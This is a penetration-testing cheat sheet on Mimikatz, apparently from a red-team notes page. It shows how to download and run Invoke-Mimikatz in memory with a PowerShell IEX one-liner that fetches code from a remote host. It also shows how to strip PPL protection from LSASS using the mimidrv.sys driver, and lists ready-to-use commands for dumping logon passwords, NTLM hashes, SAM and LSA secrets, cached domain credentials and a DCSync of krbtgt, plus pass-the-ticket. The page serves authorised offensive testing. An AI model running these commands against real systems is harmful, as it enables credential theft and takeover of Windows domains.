## Downloading Mimikatz

The mimikatz project by Benjamin Delphy is truly extraordinary. It can be used to extract all sorts of information from a target once you have SYSTEM level privileges. Here we'll look at some basic commands aswell as their OPSEC concerns.

Note: The Powershell version sometimes has weird compatability issues. There's multiple versions floating about.

 https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1 

 https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1 

Download the compiled binaries here:

 https://github.com/ParrotSec/mimikatz 

```powershell
# Load mimikatz into memory from Powershell and run a command
IEX((New-Object System.Net.WebClient).downloadString('http://10.10.10.10/Invoke-Mimikatz.ps1'))
Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'

# Run the binary on the target
mimikatz.exe 
```

## Oh no, they've protected LSASS with PPL

PPL (Protected Process Light) is an additional layer of protection that transcends even a SYSTEM level user. It is used to protect LSASS by disallowing the modification, patching, or reading of memory in the region. We can confirm if PPL is enabled by using Powershell and checking the registry key. A result of 1 indicates it is active.

```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

PPL is not activated by default. It is controlled using a singular bit which resides in the EPROCESS kernel object that is associated with the target process. Therefore, because Benjamin Delphy is incredibly smart, he developed the `mimidrv.sys` driver which can be used to execute code in kernel space, disabling the LSA protection and allowing us to obtain credentials normally.

We'll need to be SYSTEM or at least local administrator, as this comes with the `SeLoadDriverPrivilege` privilege to load drivers. The mimikatz.exe binary and mimidrv.sys file must be in the same location. Upon starting mimikatz, run the following commands:

```bash
mimikatz !+ # Loads the driver
mimikatz !processprotect /process:lsass.exe /remove # Removes the protection bit
mimikatz sekurlsa::logonpasswords # We can now dump passwords
```

You should always consider the OPSEC issues with this and ensure to re-configure the client environment!

## Useful Commands

Here are my most memorable commands from my notes. There's tons more, though, so don't be afraid to look further.

```powershell
# Escalate to SYSTEM from HIGH privilege (Admin) session
privlege::debug 

# Dump cached LSASS credentials - Dumps NTLM hashes 
sekurlsa::logonpasswords

# Dump ekeys from LSASS - Consider this an upgrade on finding NTLM hashes. Using AES128/256 keys is more stealthy as they're default in domain environments since Windows Server 2012
sekurlsa::ekeys

# Dump the SAM hive
lsadump::sam

# Dump out secrets from the local security authority
lsadump::secrets

# Dump out any Domain Cached Credentials. These are $DCC2$ hashes and can be cracked with -m 2100 in hashcat
lsadump::cache

# View stored credentials in the Credential Manager
vault::list

# Purge your ticket
kerberos::purge

# Pass in a .kirbi to your current users cache
kerberos::ptt C:\my_tgt.kirbi

# DCSync to dump out the krbtgt hash amongst others
lsadump::dcsync /domain:MATRIX.local /user:MATRIX\krbtgt

# Create a dump of lsass.exe from task manager and then transfer it back to yourself locally. This allows you to run mimikatz on it without transferring it to the target
sekurlsa::minidump <path to file.dmp>
```